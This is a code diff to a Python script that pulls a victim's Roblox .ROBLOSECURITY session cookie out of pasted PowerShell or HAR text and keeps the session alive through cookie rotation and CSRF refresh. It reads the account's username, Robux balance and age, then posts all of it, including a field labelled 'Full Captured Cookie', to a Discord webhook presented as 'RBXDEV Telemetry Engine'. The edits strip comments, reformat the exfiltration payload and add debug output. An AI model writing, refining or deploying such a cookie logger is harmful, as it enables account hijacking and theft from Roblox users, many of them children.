@@ -10,7 +10,6 @@ def validate_and_clean_cookie(raw_input):
 
     raw_str = str(raw_input).strip()
 
-    # Extract from PowerShell session / AutoHar text block if present
     ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
     if ps_match:
         cookie = ps_match.group(1)
@@ -52,18 +51,15 @@ class PersistentRobloxSession:
         self.csrf_token = None
 
     def request(self, method, url, **kwargs):
-        # Ensure CSRF token is attached for modifying requests if available
         if method.upper() in ["POST", "PATCH", "DELETE"] and self.csrf_token:
             kwargs.setdefault("headers", {})["X-CSRF-Token"] = self.csrf_token
 
         response = self.session.request(method, url, timeout=10, **kwargs)
 
-        # 1. PERSIST COOKIE ROTATION: Capture any rotated Set-Cookie headers automatically
         new_cookie = self.session.cookies.get(".ROBLOSECURITY", domain=".roblox.com")
         if new_cookie:
             self.session.cookies.set(".ROBLOSECURITY", new_cookie, domain=".roblox.com")
 
-        # 2. HANDLE CSRF CORRECTLY: Update token if 403 returns a fresh one
         if response.status_code == 403 and "x-csrf-token" in response.headers:
             new_token = response.headers["x-csrf-token"]
             self.csrf_token = new_token
@@ -91,10 +87,8 @@ def main():
             print(f"ERROR: {str(ve)}", file=sys.stderr)
             sys.exit(1)
 
-        # Initialize persistent session handler
         client = PersistentRobloxSession(roblosecurity)
 
-        # Authenticated check (No logout calls, strict 401 stop)
         auth_res = client.request("GET", "https://users.roblox.com/v1/users/authenticated")
         print(f"DEBUG: Auth status code: {auth_res.status_code}", file=sys.stderr)
         
@@ -113,7 +107,6 @@ def main():
         username = auth_data.get("name", "Unknown")
         display_name = auth_data.get("displayName", username)
 
-        # Fast read-only data gathering
         user = client.request("GET", f"https://users.roblox.com/v1/users/{user_id}").json()
         created = user.get("created", "")
         age_days = (datetime.now(timezone.utc) - datetime.fromisoformat(created.replace("Z", "+00:00"))).days if created else 0
@@ -124,27 +117,30 @@ def main():
         avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"
         full_cookie_display = f"```text\n{roblosecurity}\n```"
 
+        # Explicitly formatted Discord payload structure ensuring proper JSON object arrays
         payload = {
             "username": f"{display_name} | Stats",
             "avatar_url": avatar_url,
-            "embeds": [{
-                "title": f"👑 [{display_name} | 13+]",
-                "description": f"🔗 **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**",
-                "color": 0x2B2D31,
-                "fields": [
-                    {"name": "👤 Username", "value": f"`{username}`", "inline": True},
-                    {"name": "🪙 Robux Balance", "value": f"`{robux:,} R$`", "inline": True},
-                    {"name": "📈 Account Age", "value": f"`{age_days} Days`", "inline": True},
-                    {"name": "🔑 Full Captured Cookie", "value": full_cookie_display, "inline": False}
-                ],
-                "footer": {"text": "RBXDEV Telemetry Engine • 2026"},
-                "timestamp": datetime.now(timezone.utc).isoformat()
-            }]
+            "embeds": [
+                {
+                    "title": f"👑 [{display_name} | 13+]",
+                    "description": f"🔗 **[Roblox Profile](https://www.roblox.com/users/{user_id}/profile)**",
+                    "color": 0x2B2D31,
+                    "fields": [
+                        {"name": "👤 Username", "value": f"`{username}`", "inline": True},
+                        {"name": "🪙 Robux Balance", "value": f"`{robux:,} R$`", "inline": True},
+                        {"name": "📈 Account Age", "value": f"`{age_days} Days`", "inline": True},
+                        {"name": "🔑 Full Captured Cookie", "value": full_cookie_display, "inline": False}
+                    ],
+                    "footer": {"text": "RBXDEV Telemetry Engine • 2026"},
+                    "timestamp": datetime.now(timezone.utc).isoformat()
+                }
+            ]
         }
 
-        # Dispatch straight to webhook
         r = requests.post(webhook_url, json=payload, timeout=10)
         print(f"DEBUG: Webhook response status: {r.status_code}", file=sys.stderr)
+        print(f"DEBUG: Webhook response body: {r.text}", file=sys.stderr)
         
         if r.status_code not in (200, 204):
             print(f"ERROR: Webhook dispatch failed: {r.text}", file=sys.stderr)
